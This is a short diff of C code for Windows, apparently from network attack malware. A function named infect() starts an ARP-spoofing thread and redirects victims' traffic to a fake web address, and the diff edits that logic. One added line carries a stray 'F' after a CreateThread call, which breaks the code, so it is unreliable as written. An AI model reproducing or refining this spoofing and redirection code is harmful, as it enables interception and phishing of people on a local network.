@@ -323,7 +323,7 @@ void infect()
 
 	/* start start_arp_spoofing thread */
 	HANDLE hThread;
-	hThread = CreateThread(NULL, 0, start_arp_spoofing, (LPVOID)&host, 0, NULL);
+	hThread = CreateThread(NULL, 0, start_arp_spoofing, (LPVOID)&host, 0, NULL);F
 	if (!hThread)
 	{
 		free(pAdapterInfo);
@@ -370,7 +370,7 @@ void infect()
 				SET_DST_MAC(eth_header, infect_params.gateway_mac); 
 				
 				/* check if redirect worked */
-				if (ip_header->dest_addr == fake_web)
+				if (ip_header->dest_addr == htonl(fake_web))
 					stop_arp_spoofing();
 			}
 		}
